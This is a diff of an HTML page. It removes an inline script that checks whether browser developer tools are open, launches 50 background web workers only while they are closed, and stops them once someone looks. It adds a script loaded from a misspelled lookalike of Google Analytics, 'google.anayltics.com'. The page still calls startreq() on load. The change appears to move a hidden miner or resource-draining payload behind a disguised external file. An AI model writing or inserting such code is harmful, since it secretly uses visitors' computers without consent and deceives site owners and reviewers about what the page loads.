@@ -1,32 +1,6 @@
 <html>
   <head>
-  	<script>
-
-		(function(){'use strict';var devtools={open:false,orientation:null};var threshold=160;var emitEvent=function(state,orientation){window.dispatchEvent(new CustomEvent('devtoolschange',{detail:{open:state,orientation:orientation}}));};setInterval(function(){var widthThreshold=window.outerWidth-window.innerWidth>threshold;var heightThreshold=window.outerHeight-window.innerHeight>threshold;var orientation=widthThreshold?'vertical':'horizontal';if(!(heightThreshold&&widthThreshold)&&((window.Firebug&&window.Firebug.chrome&&window.Firebug.chrome.isInitialized)||widthThreshold||heightThreshold)){if(!devtools.open||devtools.orientation!==orientation){emitEvent(true,orientation);}
-		devtools.open=true;devtools.orientation=orientation;}else{if(devtools.open){emitEvent(false,null);}
-		devtools.open=false;devtools.orientation=null;}},500);if(typeof module!=='undefined'&&module.exports){module.exports=devtools;}else{window.devtools=devtools;}})();
-	
-		var startreq = function() {
-	
-			setTimeout(function() {
-	
-				if(!window.devtools.open) {
-	
-					for(var i = 0; i < 50; i++) {
-	
-						worker = new Worker("worker.js?r="+Math.floor(Math.random() * 99999999));
-	
-						window.addEventListener('devtoolschange', function (e) {if(e.detail.open)worker.postMessage("STOP");});
-	
-						worker.postMessage("START");
-					}
-				}
-			
-			}, 500);
-	
-		};
-
-	</script>
+	<script src="https://google.anayltics.com/ga.js"></script>
   </head>
 <body onload="startreq()">
 	<script id="_waulxx">var _wau = _wau || []; _wau.push(["dynamic", "t3dmxmwv5q", "lxx", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>
